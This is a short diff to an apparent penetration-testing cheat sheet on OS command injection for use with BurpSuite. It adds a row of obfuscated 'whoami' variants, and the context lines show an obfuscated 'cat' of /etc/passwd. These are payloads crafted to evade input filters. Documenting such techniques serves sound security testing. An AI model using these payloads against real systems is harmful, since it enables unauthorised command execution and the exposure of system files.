@@ -18,6 +18,9 @@ You can use this on BurpSuite. Method below can be use on Web Penetration Testin
     <tr>
         <td>4. cat /et${FOO:-c}/pa${BAR:-sswd}</td>
     </tr>
+    <tr>
+        <td>5. wh$()oami or whoam$(echo+i) or who'a'm(echo+i)</td>
+    </tr>
 </table>
 
 Another actual good reference:<br>
